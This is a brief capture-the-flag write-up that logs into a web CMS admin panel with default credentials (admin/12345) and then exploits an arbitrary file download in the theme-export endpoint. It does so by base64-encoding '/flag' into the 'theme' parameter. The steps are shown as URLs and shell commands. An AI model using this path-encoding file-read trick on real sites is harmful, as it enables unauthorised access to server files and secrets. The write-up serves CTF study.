![[Pasted image 20230210101327.png|500]]

![[Pasted image 20230210101401.png|400]]

```
/
```

![[Pasted image 20230210101513.png|700]]

```
/admin.php
```

![[Pasted image 20230210102927.png|500]]

```
username: admin
password: 12345
```

![[Pasted image 20230210103418.png|1000]]

![[Pasted image 20230210104206.png|1000]]

在主题页面下选择一个主题进行自定义，选择导出主题

```
/admin.php?m=ui&f=downloadtheme&theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMTExLnppcA==
```

```shell
$ echo 'L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMTExLnppcA==' | base64 -d
/var/www/html/system/tmp/theme/default/111.zip
```

```shell
$ echo -n '/flag' | base64
L2ZsYWc=
```

```
/admin.php?m=ui&f=downloadtheme&theme=L2ZsYWc=
```

```shell
$ cat Downloads/flag.zip
flag{a8b78826-5f1e-4e1c-bc3e-879941863f8c}
```

#Web #Vulnerabilities #目录扫描 #任意文件下载